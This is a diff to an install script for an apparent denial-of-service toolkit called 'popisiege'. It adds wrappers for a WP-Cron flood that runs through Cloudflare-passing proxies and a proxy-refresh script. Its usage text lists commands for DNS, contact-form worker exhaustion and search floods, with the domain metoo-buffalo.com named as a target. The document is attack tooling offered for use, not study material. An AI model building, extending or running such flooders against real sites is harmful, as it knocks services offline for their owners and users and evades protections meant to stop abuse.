@@ -75,6 +75,12 @@ _make_cmd /usr/local/bin/dns-flood \
 _make_cmd /usr/local/bin/dns-tcp-flood \
     "cd /opt/popisiege && exec python3 dns_tcp_flood.py \"\$@\""
 
+_make_cmd /usr/local/bin/popicron \
+    "exec python3 /opt/popisiege/cron_hit.py --proxy-file /opt/popisiege/proxies_cf_passing_new.txt \"\$@\""
+
+_make_cmd /usr/local/bin/refresh-proxies \
+    "exec bash /opt/popisiege/refresh_proxies.sh"
+
 # ── done ───────────────────────────────────────────────────────────────────────
 echo ""
 echo -e "${B}=============================="
@@ -85,6 +91,11 @@ echo -e "  ${B}CF7 Worker Exhaustion:${W}"
 echo    "    popibundmara --verbose"
 echo    "    popibundmara --target metoo-buffalo.com"
 echo    "    popibundmara --concurrency 30 --verbose"
+echo ""
+echo -e "  ${B}WP-Cron Flood (US proxies):${W}"
+echo    "    refresh-proxies"
+echo    "    popicron --target metoo-buffalo.com --concurrency 25"
+echo    "    popicron --concurrency 30 --bursts 0"
 echo ""
 echo -e "  ${B}Search Flood (PHP + MySQL):${W}"
 echo    "    search-flood --verbose"
